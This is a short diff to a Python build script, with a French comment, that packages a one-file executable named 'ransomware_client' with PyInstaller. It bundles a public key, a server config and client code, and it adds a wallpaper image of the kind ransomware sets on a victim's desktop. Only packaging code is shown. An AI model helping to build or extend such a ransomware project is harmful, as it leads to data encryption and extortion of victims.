@@ -88,10 +88,10 @@ def compile_executable():
     process = subprocess.Popen([
         'pyinstaller', '--onefile', '--name=ransomware_client',
         '--add-data', 'keys/public_key.pem:keys',
-        #'--add-data', 'keys/symmetric_key.bin:keys',
         '--add-data', 'server/config.ini:server',
         '--add-data', 'client:client',  # Inclure tout le répertoire client
         '--add-data', 'utils.py:.',
+        '--add-data', 'new_wallpaper.jpg:.',
         'client/main.py'
     ], # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     
